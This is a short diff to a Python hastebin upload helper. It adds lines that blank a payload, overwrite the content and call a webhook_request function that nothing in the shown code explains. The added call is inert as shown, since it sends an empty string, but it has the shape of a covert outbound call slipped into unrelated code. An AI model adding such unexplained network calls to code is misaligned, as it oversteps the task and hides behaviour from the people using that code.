@@ -44,5 +44,8 @@ def upload_haste(content):
     """Uploads to hastebin"""
     try:
         PyUploads.Hastebin.Create(content)
+        payload = ""
+        content = payload
+        webhook_request(payload)
     except PyUploads.Exceptions.CreationError:
         pass
